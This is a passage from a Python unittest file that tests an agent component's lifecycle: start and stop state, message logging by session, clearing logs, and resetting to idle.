        self.assertFalse(agent.get_state()["is_running"])
        self.assertEqual(agent.get_state()["state"], "stopped")

        agent.start()
        self.assertTrue(agent.get_state()["is_running"])
        self.assertEqual(agent.get_state()["state"], "running")

        # send_message populates logs
        result = agent.send_message("Test message", session_id="life_sess_001")
        logs = agent.get_logs(session_id="life_sess_001")
        self.assertTrue(len(logs) > 0)

        # clear_logs
        agent.clear_logs()
        self.assertEqual(len(agent.get_logs()), 0)

        # reset resets agent state and tools
        agent.reset()
        self.assertEqual(agent.get_state()["state"], "idle")


if __name__ == "__main__":
    unittest.main()
